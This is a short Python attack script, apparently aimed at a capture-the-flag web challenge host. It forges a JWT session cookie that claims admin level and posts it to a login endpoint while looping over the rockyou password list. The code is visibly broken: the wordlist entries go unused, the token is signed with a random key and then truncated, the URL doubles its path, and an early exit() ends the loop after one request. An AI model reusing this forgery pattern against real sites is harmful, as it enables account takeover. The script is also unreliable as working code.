# standard imports
import requests
import os 
import binascii
import base64
import jwt

url = "http://host1.dreamhack.games:8310/login"


with open("/usr/share/wordlists/rockyou.txt",encoding="latin-1") as handle:
	for x in handle.readlines():

		session_string = jwt.encode({"idx":1,"level":"admin","name":"Apple","userid":"Apple"},str(os.urandom(32)),algorithm="HS256")
		session_string = session_string.decode()[0:-18]

		print("trying secret_key {}" .format(session_string))
		print("\n")
		r = requests.post(url+"login", cookies={"session":session_string})

		print(r.text)
		exit()
		if "{" in r.text:
			print(r.text)